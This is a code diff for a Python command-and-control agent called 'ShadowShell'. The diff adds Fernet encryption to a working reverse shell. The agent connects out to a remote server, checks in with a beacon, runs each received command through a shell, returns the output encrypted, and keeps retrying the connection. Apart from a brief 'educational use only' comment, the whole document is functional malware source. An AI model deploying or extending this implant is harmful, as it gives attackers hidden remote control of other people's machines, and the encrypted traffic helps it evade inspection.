@@ -2,45 +2,59 @@ import socket
 import subprocess
 import argparse
 import time
+from cryptography.fernet import Fernet
 
-# ShadowShell C2 Agent (Plaintext Prototype)
+# ShadowShell C2 Agent (Encrypted)
 # Educational use only. Authorized lab testing only.
 
-def connect_to_server(host, port):
+def load_key():
+    try:
+        with open("secret.key", "rb") as key_file:
+            return key_file.read()
+    except FileNotFoundError:
+        print("[-] secret.key not found. Run generate_key.py first!")
+        exit(1)
+
+def connect_to_server(host, port, fernet):
     while True:
         try:
-            # 1. Establish connection to C2 server
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((host, port))
             
-            # 2. Send initial beacon
-            sock.send(b"ShadowShell Agent checked in. Awaiting commands.\n")
+            # 1. Send encrypted initial beacon
+            beacon = b"ShadowShell Agent checked in. Awaiting commands.\n"
+            encrypted_beacon = fernet.encrypt(beacon)
+            sock.send(encrypted_beacon)
             
-            # 3. Listen for commands in a loop
             while True:
-                cmd = sock.recv(4096).decode('utf-8')
-                
-                # If server closes connection or sends exit command
-                if not cmd or cmd.lower() == 'exit':
+                # 2. Receive encrypted command
+                encrypted_cmd = sock.recv(4096)
+                if not encrypted_cmd:
                     break
                 
-                # 4. Execute the command using subprocess
+                # Decrypt command
                 try:
-                    # shell=True is used for demonstration of command execution
+                    cmd = fernet.decrypt(encrypted_cmd).decode('utf-8')
+                except Exception:
+                    break # Exit if we can't decrypt (server might be messing up)
+                
+                if cmd.lower() == 'exit':
+                    break
+                
+                # 3. Execute command
+                try:
                     output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                     result = output.stdout + output.stderr
-                    
-                    # Handle commands that return no output (like 'cd')
                     if not result:
                         result = "[*] Command executed successfully (no output).\n"
                 except Exception as e:
                     result = f"[-] Error executing command: {e}\n"
                 
-                # 5. Send the output back to the server
-                sock.send(result.encode('utf-8'))
+                # 4. Encrypt output and send back
+                encrypted_result = fernet.encrypt(result.encode('utf-8'))
+                sock.send(encrypted_result)
                 
         except ConnectionRefusedError:
-            # If server isn't up yet, wait and retry (realistic malware behavior)
             print("[-] Connection refused. Retrying in 5 seconds...")
             time.sleep(5)
         except Exception as e:
@@ -53,4 +67,6 @@ if __name__ == "__main__":
     parser.add_argument("--port", type=int, default=4444, help="C2 Server Port (default: 4444)")
     args = parser.parse_args()
     
-    connect_to_server(args.host, args.port)
+    key = load_key()
+    fernet = Fernet(key)
+    connect_to_server(args.host, args.port, fernet)
